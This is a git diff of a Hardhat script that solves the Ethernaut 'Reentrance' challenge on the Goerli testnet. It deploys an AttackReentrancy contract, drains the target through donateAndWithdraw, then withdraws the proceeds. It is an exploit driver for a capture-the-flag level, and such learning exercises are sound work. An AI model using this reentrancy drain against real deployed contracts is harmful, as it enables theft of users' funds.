@@ -2,9 +2,9 @@ import { ethers } from "hardhat";
 
 const attackReentrance = async () => {
     // change contract addresses here.
-    const reentranceAddress = "0xEfC594B6E8100d412aadc34D4E6ACBbD6CC0E85a"; //type "await contract.address()" in ethernaut console
-    const args: string[] = [reentranceAddress];
-    const deployer = process.env.PRIVATE_KEY || "";
+    const reentrancyAddress = "0x6a50672DA7304dD2b4328EC445794F00627Fc8Fc"; //type "await contract.address()" in ethernaut console
+    const args: string[] = [reentrancyAddress];
+    const player = process.env.PRIVATE_KEY || "";
     // [deployer] = await ethers.getSigners();
 
     // Don't touch below 🚀
@@ -17,12 +17,12 @@ const attackReentrance = async () => {
     // deploying attack contract here
     // const deployed = await deployContract(hre, "EternalKing", args);
     // alternative below
-    console.log("Deploying attack contract AttackReentrance...");
-    const Factory = await ethers.getContractFactory("AttackReentrance", deployer);
-    const attackReentrance = await Factory.deploy();
-    console.log(attackReentrance);
-    console.log(`Contract deployed to ${attackReentrance.address}`);
-    console.log("Attack contract deployed...");
+    console.log("Deploying attack contract AttackReentrancy...");
+    const attack = await (
+        await ethers.getContractFactory("AttackReentrancy", player)
+    ).deploy(reentrancyAddress);
+    console.log(attack);
+    console.log(`Attack contract deployed to ${attack.address}`);
     // experimantal verify below
     // if (attackReentrance.address){
     //     console.log("Verifying contract...");
@@ -41,39 +41,38 @@ const attackReentrance = async () => {
     // }
 
     // typing all commands in console below
-    const attack = await ethers.getContractAt("AttackReentrance", attackReentrance.address);
-    // const provider = ethers.getDefaultProvider("goerli");    // alternate defualt provider
+    // using my custom rpc stored in .env (for privacy)
     const GOERLI_RPC_URL = process.env.GOERLI_RPC_URL;
     const provider = new ethers.providers.JsonRpcProvider(GOERLI_RPC_URL);
     console.log("Checking current Reentrance Contract balance...");
-    let contractBalance = ethers.utils.formatEther(await provider.getBalance(reentranceAddress));
+    let contractBalance = ethers.utils.formatEther(await provider.getBalance(reentrancyAddress));
     console.log(`Balance of Reentrance Contract is: ${contractBalance} ETH`);
     const tx = await attack.donateAndWithdraw({ value: ethers.utils.parseEther("0.001") });
     const txReceipt = await tx.wait(2);
     console.log(txReceipt);
     console.log("Checking again Reentrance Contract balance...");
-    contractBalance = ethers.utils.formatEther(await provider.getBalance(reentranceAddress));
+    contractBalance = ethers.utils.formatEther(await provider.getBalance(reentrancyAddress));
     console.log(`Balance of Reentrance Contract is: ${contractBalance} ETH`);
-    if (contractBalance === "0") {
-        console.log("Reentrance Contract balance now '0'...");
+    if (contractBalance == "0.0") {
+        console.log("Reentrance Contract balance now '0.0'...");
         console.log("Withdrawing all funds from attack contract...");
         const tx1 = await attack.withdrawAll();
         const tx1Receipt = await tx1.wait();
         console.log(tx1Receipt);
-        console.log("Done, Submit to ethernaut.");
+        console.log("Congrats! Level passed, please submit to ethernaut.");
     } else {
         console.log("Waiting for a minute...");
         const run = setTimeout(async () => {
             contractBalance = ethers.utils.formatEther(
-                await provider.getBalance(reentranceAddress)
+                await provider.getBalance(reentrancyAddress)
             );
-            if (contractBalance === "0") {
-                console.log("Reentrance Contract balance now '0'...");
+            if (contractBalance == "0.0") {
+                console.log("Reentrance Contract balance now '0.0'...");
                 console.log("Withdrawing all funds from attack contract...");
                 const tx1 = await attack.withdrawAll();
                 const tx1Receipt = await tx1.wait();
                 console.log(tx1Receipt);
-                console.log("Done, Submit to ethernaut.");
+                console.log("Congrats! Level passed, please submit to ethernaut.");
             } else {
                 console.log("Reentrance Contract balance not '0'. Review code and try again...");
             }
